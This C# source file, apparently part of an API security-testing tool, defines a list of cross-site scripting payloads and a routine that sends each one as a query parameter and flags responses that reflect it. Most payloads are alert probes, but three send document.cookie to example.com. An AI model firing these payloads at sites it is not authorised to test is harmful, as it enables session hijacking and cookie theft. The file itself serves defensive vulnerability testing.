namespace API_Tester
{
    public partial class MainPage
    {
        /*
        Cross-Site Scripting (XSS) Testing Payloads

        Purpose:
        Provides payloads used to test whether the application is vulnerable
        to Cross-Site Scripting (XSS) attacks. These payloads simulate malicious
        input that may be executed in a user's browser if the application fails
        to properly sanitize or encode output.

        Threat Model:
        XSS vulnerabilities occur when an application includes untrusted user
        input in web pages or responses without proper encoding or validation.
        Attackers may attempt to:

            - inject malicious JavaScript into pages viewed by other users
            - steal session cookies or authentication tokens
            - redirect users to malicious websites
            - manipulate page content or perform actions on behalf of users

        XSS attacks are commonly categorized as:

            - Reflected XSS (payload returned immediately in response)
            - Stored XSS (payload stored in database and served later)
            - DOM-based XSS (payload executed through client-side scripts)

        Common vulnerabilities include:

            - failure to encode user input in HTML output
            - lack of input sanitization
            - unsafe rendering of dynamic content
            - improper handling of user-supplied HTML or script data
            - missing Content Security Policy (CSP) protections

        Test Strategy:
        The payloads returned by this method simulate typical XSS attack patterns
        such as script execution or event-based JavaScript triggers. These inputs
        help determine whether the application improperly reflects or stores
        executable code.

        Potential Impact:
        If XSS vulnerabilities exist, attackers may:

            - hijack user sessions
            - steal authentication tokens or cookies
            - perform actions on behalf of authenticated users
            - deface application content
            - distribute malware or phishing attacks

        Expected Behavior:
        Applications should:

            - encode all user input before rendering in HTML
            - sanitize or filter dangerous input where appropriate
            - implement Content Security Policy (CSP) headers
            - avoid rendering untrusted input directly in scripts or DOM contexts
            - monitor and log suspicious input patterns
        */
        
        private static string[] GetXssPayloads() =>
        [
            "<script>alert(1)</script>",
            "\"><img src=x onerror=alert(1)>",
            "<svg/onload=alert(document.domain)>",
            "{{7*7}}<script>alert(String.fromCharCode(88,83,83))</script>",
            "<img src='x' onerror='alert(1)'>",
            "<script>confirm('XSS')</script>",
            "<script>document.location='http://example.com?cookie=' + document.cookie;</script>",
            "<a href='javascript:alert(1)'>Click me</a>",
            "<iframe src='javascript:alert(1)'></iframe>",
            "<input type='text' value=''><script>alert(document.cookie)</script>",
            "<script>document.write('<img src=\'http://example.com?cookie=' + document.cookie + '\'/>');</script>",
            "<body onload=alert('XSS')>",
            "<script>eval('alert(1)')</script>",
            "<script>fetch('http://example.com?cookie=' + document.cookie);</script>",
            "<svg><script>alert('XSS')</script></svg>",
            "<script>setTimeout(() => { alert('XSS') }, 1000);</script>",
            "<script>window.onload = function() { alert('XSS') }</script>"
        ];

        private async Task<string> RunXssTestsAsync(Uri baseUri)
        {
            var payloads = GetManualPayloadsOrDefault(GetXssPayloads(), ManualPayloadCategory.Xss);
            var findings = new List<string>();
            var reflected = 0;

            for (var i = 0; i < payloads.Length; i++)
            {
                var payload = payloads[i];
                var probeUri = AppendQuery(baseUri, new Dictionary<string, string> { ["q"] = payload });
                var response = await SafeSendAsync(() => new HttpRequestMessage(HttpMethod.Get, probeUri));
                var body = await ReadBodyAsync(response);

                findings.Add($"Payload {i + 1}: HTTP {FormatStatus(response)}");

                if (ContainsAny(body, payload, "<script>", "onerror=", "onload="))
                {
                    reflected++;
                }
            }

            findings.Insert(0, $"Payload variants: {payloads.Length}");
            findings.Add(reflected > 0
                ? $"Potential risk: reflected XSS markers observed on {reflected}/{payloads.Length} probes."
                : "No obvious reflected XSS markers in tested responses.");

            return FormatSection("XSS", baseUri, findings);
        }
    }
}
